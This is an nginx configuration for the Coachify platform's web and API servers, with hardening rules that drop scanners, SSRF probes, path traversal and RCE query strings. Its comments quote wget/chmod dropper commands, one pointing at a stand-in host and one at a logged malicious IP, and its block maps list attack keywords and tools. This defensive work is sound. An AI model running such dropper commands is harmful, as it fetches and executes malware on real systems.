# Production Nginx Configuration for Coachify Platform
# Supports both app.coachify.tn (main app) and coachify.tn (vitrine)
# HARDENED — see bottom of file for change summary

user nginx;
worker_processes auto;
pid /var/run/nginx.pid;

events {
    worker_connections 4096;
    use epoll;
    multi_accept on;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    # Logging
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent"';

    # Structured JSON format consumed by Promtail for IP-based queries in Loki
    log_format json_combined escape=json
        '{'
            '"time":"$time_iso8601",'
            '"remote_addr":"$remote_addr",'
            '"client_ip":"$http_x_forwarded_for",'
            '"real_ip":"$remote_addr",'
            '"method":"$request_method",'
            '"path":"$request_uri",'
            '"status":$status,'
            '"bytes":$body_bytes_sent,'
            '"duration":$request_time,'
            '"upstream":"$upstream_addr",'
            '"agent":"$http_user_agent",'
            '"host":"$server_name"'
        '}';

    # [HARDENED] Blocked requests log format
    log_format blocked escape=json
        '{'
            '"time":"$time_iso8601",'
            '"remote_addr":"$remote_addr",'
            '"client_ip":"$http_x_forwarded_for",'
            '"method":"$request_method",'
            '"path":"$request_uri",'
            '"status":$status,'
            '"agent":"$http_user_agent",'
            '"referer":"$http_referer",'
            '"host":"$host",'
            '"reason":"blocked"'
        '}';

    access_log /dev/stdout main;                              # → docker logs
    access_log /var/log/nginx/access_json.log json_combined; # → Promtail/Loki
    error_log  /dev/stderr warn;                              # → docker logs
    error_log  /var/log/nginx/error.log warn;                 # → Promtail/Loki

    # Performance
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    client_max_body_size 100M;

    # Proxy buffer settings for large headers (NextAuth sessions)
    proxy_buffer_size 16k;
    proxy_buffers 8 16k;
    proxy_busy_buffers_size 24k;

    # Gzip
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css text/xml text/javascript
               application/json application/javascript;

    # Docker DNS - CRITICAL
    resolver 127.0.0.11 valid=10s ipv6=off;
    resolver_timeout 5s;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=50r/s;
    limit_req_zone $binary_remote_addr zone=auth:10m rate=5r/s;
    limit_req_zone $binary_remote_addr zone=proxy:10m rate=100r/s;
    # [HARDENED] Additional rate-limit zone for scanner/bot mitigation
    limit_req_zone $binary_remote_addr zone=req_limit:10m rate=20r/s;

    server_tokens off;

    # ===========================================
    # [HARDENED] Real IP from reverse proxy
    # ===========================================
    real_ip_header X-Forwarded-For;
    real_ip_recursive on;
    set_real_ip_from 172.16.0.0/12;   # Docker bridge networks
    set_real_ip_from 10.0.0.0/8;      # Docker overlay / private
    set_real_ip_from 127.0.0.1;

    # ===========================================
    # [HARDENED] Security headers (http-level)
    # ===========================================
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # ===========================================
    # [HARDENED] Bad bot detection
    # ===========================================
    map $http_user_agent $bad_bot {
        default 0;
        ~*masscan       1;
        ~*zgrab          1;
        ~*python-requests 1;
        ~*python-urllib  1;
        ~*nikto          1;
        ~*sqlmap         1;
        ~*nmap           1;
        ~*dirbuster      1;
        ~*gobuster       1;
        ~*nuclei         1;
        ~*censys         1;
        ~*shodan         1;
        ~*netcraft       1;
        ~*wpscan         1;
        ~*httprobe       1;
        ~*curl/             1;
        ~*libcurl           1;
        "~*iPhone; CPU iPhone OS 13_2_3"  1;  # credential-stuffing UA
        # Go HTTP client (used by DNS rebinding probes & scanners)
        "Go-http-client/1.1"  1;
        "Go-http-client/2.0"  1;
    }

    # [HARDENED] Exempt Docker-internal source IPs from bad_bot blocking.
    # Services inside the coachify_net bridge use Go's default HTTP client
    # and would otherwise be blocked when calling any nginx-fronted endpoint.
    geo $internal_docker {
        default          0;
        127.0.0.1        1;   # loopback
        10.0.0.0/8       1;   # Docker overlay / private
        172.16.0.0/12    1;   # Docker bridge networks (covers 172.17.x.x … 172.31.x.x)
        192.168.0.0/16   1;   # host-mode containers / VPN
    }

    # Combined signal: bad bot AND not from an internal Docker IP → block
    map $bad_bot$internal_docker $block_bot {
        default  0;
        "10"     1;   # bad_bot=1, internal_docker=0 → block
    }

    # [HARDENED] Empty User-Agent detection
    map $http_user_agent $empty_ua {
        default 0;
        ""      1;
    }

    # [HARDENED] SSRF & DNS rebinding probe detection (query string)
    map $args $block_ssrf {
        default     0;
        ~*dnsmeasure  1;
        ~*1u\.ms      1;
        ~*rbndr\.us   1;
        ~*nip\.io     1;
        ~*rebind      1;
        ~*169\.254    1;
    }

    # [HARDENED] Known attacker IP blocklist
    # Add IPs from log analysis — then reload nginx (docker exec nginx nginx -s reload).
    geo $blocked_ip {
        default          0;
        193.32.249.248   1;   # RCE dropper probe 2026-04-10: /exec?cmd=wget 185.193.126.158:8081/x64
    }

    # [HARDENED] RCE command injection in query string
    # Catches shell commands injected via query parameters, e.g.:
    #   ?redirectUrl=/exec?cmd=cd+/tmp;+wget+http://evil/x64;+chmod+x+x64;+./x64
    # Covers plain-text and URL-encoded (%2F, %3F, %3D) and double-encoded (%252F) variants.
    map $args $block_rce_args {
        default              0;
        ~*%2[Ff]exec         1;   # URL-encoded /exec (%2Fexec or %2fexec)
        ~*exec%3[Ff]         1;   # exec? — URL-encoded question mark
        ~*cmd%3[Dd]          1;   # cmd= — URL-encoded equals sign
        ~*[?&]cmd=           1;   # cmd= plain-text parameter
        ~*wget               1;   # wget download command
        ~*chmod              1;   # chmod permission command
        ~*%252[Ff]           1;   # double-encoded slash (%252F → decoded %2F → /)
        ~*%2[Ff]tmp          1;   # URL-encoded /tmp (dropper staging directory)
        ~*185\.193\.126     1;   # known malicious C2 dropper IP
    }

    # [HARDENED] RFI / path-traversal probe detection
    # Blocks requests to server-side script extensions and known injection patterns.
    # .txt is included because attackers POST to random .txt paths (RSC-probe technique)
    # to detect Next.js/React Server Components and test for file-inclusion vectors.
    map $request_uri $block_rfi {
        default                                      0;
        ~*\.(php|phtml|phar|asp|aspx|jsp|cfm|cgi)   1;  # server-side script extensions
        ~*\.(sh|bash|py|pl|cmd|bat|ps1|vbs)          1;  # shell / scripting extensions
        ~*\.(txt|log|bak|sql|old|orig|save|swp)$     1;  # data/backup file probes
        ~*(eval|base64_decode|passthru|system\(|exec\(|shell_exec|phpinfo) 1;  # injection keywords
        ~*\.\./                                      1;  # path-traversal sequences
    }

    # [HARDENED] Payment webhook exemption from bot-UA blocking.
    # Flouci (and other payment providers) send server-to-server callbacks using
    # python-requests or similar non-browser HTTP clients.  These are legitimate
    # machine-to-machine calls and must NOT be blocked by $bad_bot detection.
    map $request_uri $is_payment_webhook {
        default               0;
        ~^/payments/webhooks/ 1;
    }

    # Combine $block_bot + $is_payment_webhook into one effective signal:
    # "10" = bad_bot UA from external IP on a normal path        → block
    # "11" = bad_bot UA from external IP on a webhook path       → allow
    # "00"/"01" = clean UA                                       → allow
    map $block_bot$is_payment_webhook $block_bot_effective {
        default  0;
        "10"     1;
    }

    # [HARDENED] Dangerous HTTP method detection (WebDAV, TRACE, etc.)
    map $request_method $block_method {
        default   0;
        PROPFIND  1;
        MKCOL     1;
        COPY      1;
        MOVE      1;
        LOCK      1;
        UNLOCK    1;
        TRACE     1;
        TRACK     1;
    }

    # ===========================================
    # Upstreams
    # ===========================================

    # Main Application Frontend
    upstream frontend_upstream {
        least_conn;
        server frontend:3000 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    # Landing Page Frontend
    upstream landing_upstream {
        least_conn;
        server landing:3001 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    # Backend APIs
    upstream account_upstream {
        least_conn;
        server account-api:8082 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream chat_upstream {
        least_conn;
        server chat-api:8083 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream workout_upstream {
        least_conn;
        server workout-api:8087 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream tracker_upstream {
        least_conn;
        server tracker-api:8088 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream statistics_upstream {
        least_conn;
        server statistics-api:8089 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream payments_upstream {
        least_conn;
        server payments-api:8086 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream notification_upstream {
        least_conn;
        server notification-api:8081 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream invitation_upstream {
        least_conn;
        server invitation-api:8085 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    upstream content_upstream {
        least_conn;
        server content-api:8084 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }

    # ===========================================
    # [HARDENED] Default catch-all — drop unknown Host headers on port 80
    # Scanners that hit the IP directly without a valid Host get 444
    # Port 443 catch-all requires a self-signed cert; omitted since certbot manages certs here
    # ===========================================
    server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name _;

        access_log /var/log/nginx/blocked.log blocked;
        return 444;
    }

    # ===========================================
    # HTTP to HTTPS Redirect - Main App
    # ===========================================
    server {
        listen 80;
        listen [::]:80;
        server_name app.coachify.tn;

        location /.well-known/acme-challenge/ {
            root /var/www/certbot;
        }

        location / {
            return 301 https://$host$request_uri;
        }
    }

    # ===========================================
    # HTTP to HTTPS Redirect - Vitrine
    # ===========================================
    server {
        listen 80;
        listen [::]:80;
        server_name coachify.tn www.coachify.tn;

        location /.well-known/acme-challenge/ {
            root /var/www/certbot;
        }

        location / {
            return 301 https://$host$request_uri;
        }
    }

    # ===========================================
    # HTTP to HTTPS Redirect - API
    # ===========================================
    server {
        listen 80;
        listen [::]:80;
        server_name api.coachify.tn;

        location /.well-known/acme-challenge/ {
            root /var/www/certbot;
        }

        location / {
            return 301 https://$host$request_uri;
        }
    }

    # ===========================================
    # HTTPS Server - Main Application (app.coachify.tn)
    # ===========================================
    server {
        listen 443 ssl;
        listen [::]:443 ssl;
        http2 on;
        server_name app.coachify.tn;

        # SSL Configuration
        ssl_certificate /etc/letsencrypt/live/app.coachify.tn/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/app.coachify.tn/privkey.pem;
        ssl_trusted_certificate /etc/letsencrypt/live/app.coachify.tn/chain.pem;

        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 10m;

        # Security headers
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header X-Frame-Options "SAMEORIGIN" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-XSS-Protection "1; mode=block" always;
        # [HARDENED]
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;

        # -----------------------------------------------
        # [HARDENED] Bot & scanner blocking (early exit)
        # -----------------------------------------------
        # Block empty User-Agent
        if ($empty_ua) {
            return 444;
        }

        # Block known bad bots — internal Docker IPs are exempt via $block_bot
        if ($block_bot) {
            return 444;
        }

        # Block SSRF / DNS rebinding probes in query string
        if ($block_ssrf) {
            return 444;
        }

        # Block RFI / path-traversal probes
        if ($block_rfi) {
            return 444;
        }

        # Block dangerous HTTP methods (WebDAV, TRACE, TRACK)
        if ($block_method) {
            return 444;
        }

        # Block known attacker IPs (see geo $blocked_ip in http block)
        if ($blocked_ip) {
            return 444;
        }

        # Block RCE command injection in query string (e.g. ?redirectUrl=/exec?cmd=wget...)
        if ($block_rce_args) {
            return 444;
        }

        # Block .env, .git, .svn, .htaccess, .DS_Store (silent drop)
        location ~* /\.(env|git|svn|htaccess|htpasswd|DS_Store|config|sql|bak|old|orig|save|swp|log) {
            access_log /var/log/nginx/blocked.log blocked;
            return 444;
        }

        # Block common scanner/exploit paths
        location ~* ^/(wp-login\.php|wp-admin|wp-includes|wp-content|xmlrpc\.php|phpMyAdmin|phpmyadmin|pma|admin\.php|adminer|boaform|cgi-bin|\.well-known/security\.txt|actuator|api/v1/pods|solr|telescope|_ignition|vendor/phpunit) {
            access_log /var/log/nginx/blocked.log blocked;
            return 444;
        }

        # Block hex/alphanum short-path probes (zgrab /aab8, /aaa9 technique)
        location ~* ^/[a-f0-9]\{3,8\}$ {
            return 444;
        }
        location ^~ /RSC/ {
            limit_except GET {
                deny all;
            }
            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
        }

        # Next.js static assets
        location /_next/static/ {
            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            expires 365d;
            add_header Cache-Control "public, max-age=31536000, immutable";
            access_log off;
        }

        location /_next/image {
            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
        }

        location /_next/data/ {
            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
        }

        # Auth routes - CRITICAL - Must be first
        location /api/auth/ {
            limit_req zone=auth burst=20 nodelay;

            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Port 443;

            # Large buffers for NextAuth JWT sessions
            proxy_buffer_size 32k;
            proxy_buffers 8 32k;
            proxy_busy_buffers_size 224k;

            proxy_buffering on;
            proxy_request_buffering off;
            proxy_redirect off;

            proxy_connect_timeout 30s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # Next.js proxy routes - Must be second
        location /api/proxy/ {
            limit_req zone=proxy burst=100 nodelay;

            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Host $host;

            proxy_buffering off;
            proxy_cache_bypass $http_upgrade;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";

            proxy_connect_timeout 10s;
            proxy_send_timeout 90s;
            proxy_read_timeout 90s;
        }

        # ALL other /api/* routes go to Next.js frontend
        location /api/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Host $host;

            # Support WebSocket upgrades for chat
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_cache_bypass $http_upgrade;

            proxy_connect_timeout 10s;
            proxy_send_timeout 90s;
            proxy_read_timeout 90s;
        }

        # Frontend catch-all
        location / {
            limit_req zone=general burst=30 nodelay;

            proxy_pass http://frontend_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Port 443;

            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection 'upgrade';
            proxy_cache_bypass $http_upgrade;
            proxy_redirect off;

            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;

            proxy_buffering on;
            proxy_buffer_size 4k;
            proxy_buffers 8 4k;
        }

        # Health check
        location /health {
            access_log off;
            return 200 "OK\n";
            add_header Content-Type text/plain;
        }
    }

    # ===========================================
    # HTTPS Server - API Subdomain (api.coachify.tn)
    # ===========================================
    server {
        listen 443 ssl;
        listen [::]:443 ssl;
        http2 on;
        server_name api.coachify.tn;

        # SSL Configuration
        ssl_certificate /etc/letsencrypt/live/api.coachify.tn/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/api.coachify.tn/privkey.pem;
        ssl_trusted_certificate /etc/letsencrypt/live/api.coachify.tn/chain.pem;

        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 10m;

        # Security headers
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header X-Frame-Options "SAMEORIGIN" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-XSS-Protection "1; mode=block" always;
        # [HARDENED]
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;

        # Common proxy headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;

        # -----------------------------------------------
        # [HARDENED] Bot & scanner blocking (early exit)
        # -----------------------------------------------
        if ($empty_ua) {
            return 444;
        }

        # Block known bad bots — internal Docker IPs are exempt via $block_bot.
        # Payment webhook paths are also exempt (see $block_bot_effective in http block).
        if ($block_bot_effective) {
            return 444;
        }

        # Block SSRF / DNS rebinding probes in query string
        if ($block_ssrf) {
            return 444;
        }

        # Block RFI / path-traversal probes
        if ($block_rfi) {
            return 444;
        }

        # Block dangerous HTTP methods (WebDAV, TRACE, TRACK)
        if ($block_method) {
            return 444;
        }

        # Block known attacker IPs (see geo $blocked_ip in http block)
        if ($blocked_ip) {
            return 444;
        }

        # Block RCE command injection in query string (e.g. ?redirectUrl=/exec?cmd=wget...)
        if ($block_rce_args) {
            return 444;
        }

        # Block .env, .git, .svn, .htaccess (silent drop)
        location ~* /\.(env|git|svn|htaccess|htpasswd|DS_Store|config|sql|bak|old|orig|save|swp|log) {
            access_log /var/log/nginx/blocked.log blocked;
            return 444;
        }

        # Block common scanner/exploit paths
        location ~* ^/(wp-login\.php|wp-admin|wp-includes|wp-content|xmlrpc\.php|phpMyAdmin|phpmyadmin|pma|admin\.php|adminer|boaform|cgi-bin|actuator|api/v1/pods|solr|telescope|_ignition|vendor/phpunit) {
            access_log /var/log/nginx/blocked.log blocked;
            return 444;
        }

        # -------------------------------------------
        # Payments
        # -------------------------------------------

        # Flouci webhook callback — exact-match.
        # Flouci POSTs server-to-server confirmations and GETs the return URL.
        # The Go router registers the handler at /webhooks/flouci (no /payments/ prefix),
        # so we must strip /payments/ here, same as the general /payments/ block below.
        location = /payments/webhooks/flouci {
            proxy_pass http://payments_upstream/webhooks/flouci;
            proxy_http_version 1.1;
            proxy_buffering off;
            client_max_body_size 10M;
            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 60s;
        }

        location /payments/ {
            limit_req zone=api burst=30 nodelay;

            proxy_pass http://payments_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 60s;
        }

        # -------------------------------------------
        # Workout
        # -------------------------------------------
        location /workout/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://workout_upstream/;
            proxy_http_version 1.1;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_connect_timeout 10s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # -------------------------------------------
        # Notifications
        # -------------------------------------------
        location /notifications/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://notification_upstream/;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;

            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;

            proxy_buffering on;
            proxy_buffer_size 8k;
            proxy_buffers 8 8k;
        }

        # -------------------------------------------
        # Account
        # -------------------------------------------
        location /account/ {
            limit_req zone=auth burst=20 nodelay;

            proxy_pass http://account_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # -------------------------------------------
        # Chat
        # -------------------------------------------
        location /chat/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://chat_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # -------------------------------------------
        # Tracker — SSE long-poll (must be before /tracker/)
        # -------------------------------------------
        # /tracker/notifications/stream/ is a Server-Sent Events endpoint.
        # nginx's default proxy_read_timeout (60s) kills idle SSE connections;
        # set to 3600s so the stream stays open for up to 1 hour.
        # proxy_buffering off is required — SSE pushes incremental chunks;
        # buffering would hold them until the buffer fills, breaking the protocol.
        # X-Accel-Buffering no instructs any intermediate proxy (e.g. CDN) to
        # also disable buffering for this response.
        location ^~ /tracker/notifications/stream/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://tracker_upstream/notifications/stream/;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;

            # SSE-critical settings
            proxy_buffering off;
            proxy_cache off;
            add_header X-Accel-Buffering "no";

            proxy_connect_timeout 10s;
            proxy_send_timeout 3600s;
            proxy_read_timeout 3600s;
        }

        # -------------------------------------------
        # Tracker
        # -------------------------------------------
        location /tracker/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://tracker_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # -------------------------------------------
        # Statistics
        # -------------------------------------------
        location /statistics/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://statistics_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # -------------------------------------------
        # Invitation
        # -------------------------------------------
        location /invitation/ {
            limit_req zone=api burst=30 nodelay;

            proxy_pass http://invitation_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
        }

        # -------------------------------------------
        # Content / Blog
        # -------------------------------------------
        location /content/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://content_upstream/;
            proxy_http_version 1.1;
            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
        }

        # Health check
        location /health {
            access_log off;
            return 200 "OK\n";
            add_header Content-Type text/plain;
        }

        # Deny everything else
        location / {
            return 404;
        }
    }

    # ===========================================
    # HTTPS Server - Vitrine/Landing Page (coachify.tn)
    # ===========================================
    server {
        listen 443 ssl;
        listen [::]:443 ssl;
        http2 on;
        server_name coachify.tn www.coachify.tn;

        # SSL Configuration
        ssl_certificate /etc/letsencrypt/live/coachify.tn/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/coachify.tn/privkey.pem;
        ssl_trusted_certificate /etc/letsencrypt/live/coachify.tn/chain.pem;

        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 10m;

        # Security headers
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header X-Frame-Options "SAMEORIGIN" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-XSS-Protection "1; mode=block" always;
        # [HARDENED]
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;

        # Redirect www to non-www
        if ($host = 'www.coachify.tn') {
            return 301 https://coachify.tn$request_uri;
        }

        # -----------------------------------------------
        # [HARDENED] Bot & scanner blocking (early exit)
        # -----------------------------------------------
        if ($empty_ua) {
            return 444;
        }

        # Block known bad bots — internal Docker IPs are exempt via $block_bot
        if ($block_bot) {
            return 444;
        }

        # Block SSRF / DNS rebinding probes in query string
        if ($block_ssrf) {
            return 444;
        }

        # Block RFI / path-traversal probes
        if ($block_rfi) {
            return 444;
        }

        # Block dangerous HTTP methods (WebDAV, TRACE, TRACK)
        if ($block_method) {
            return 444;
        }

        # Block known attacker IPs (see geo $blocked_ip in http block)
        if ($blocked_ip) {
            return 444;
        }

        # Block RCE command injection in query string (e.g. ?redirectUrl=/exec?cmd=wget...)
        if ($block_rce_args) {
            return 444;
        }

        # Block .env, .git, .svn, .htaccess (silent drop)
        location ~* /\.(env|git|svn|htaccess|htpasswd|DS_Store|config|sql|bak|old|orig|save|swp|log) {
            access_log /var/log/nginx/blocked.log blocked;
            return 444;
        }

        # Block common scanner/exploit paths
        location ~* ^/(wp-login\.php|wp-admin|wp-includes|wp-content|xmlrpc\.php|phpMyAdmin|phpmyadmin|pma|admin\.php|adminer|boaform|cgi-bin|actuator|api/v1/pods|solr|telescope|_ignition|vendor/phpunit) {
            access_log /var/log/nginx/blocked.log blocked;
            return 444;
        }

        # Next.js/Vite static assets
        location /_next/static/ {
            proxy_pass http://landing_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            expires 365d;
            add_header Cache-Control "public, max-age=31536000, immutable";
            access_log off;
        }

        location /_next/image {
            proxy_pass http://landing_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
        }

        # Static assets (for Vite/React apps)
        location /assets/ {
            proxy_pass http://landing_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            expires 365d;
            add_header Cache-Control "public, max-age=31536000, immutable";
            access_log off;
        }

        # API routes for landing (if any)
        location /api/payment/ {
            limit_req zone=api burst=30 nodelay;

            proxy_pass http://payments_upstream/;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;

            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
        }

        location /api/ {
            limit_req zone=api burst=30 nodelay;

            proxy_pass http://landing_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;

            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
        }

        # Main landing routes
        location / {
            limit_req zone=general burst=30 nodelay;

            proxy_pass http://landing_upstream;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Port 443;

            proxy_redirect off;

            proxy_connect_timeout 10s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;

            # Increased buffer sizes to prevent large PNG/image responses from
            # spilling to a temporary file ("upstream response is buffered" warning).
            # 16 x 32k = 512k in-memory, covers typical banner/OG image sizes.
            proxy_buffering on;
            proxy_buffer_size 64k;
            proxy_buffers 16 32k;
            proxy_busy_buffers_size 128k;
        }

        # Health check
        location /health {
            access_log off;
            return 200 "OK\n";
            add_header Content-Type text/plain;
        }
    }
}
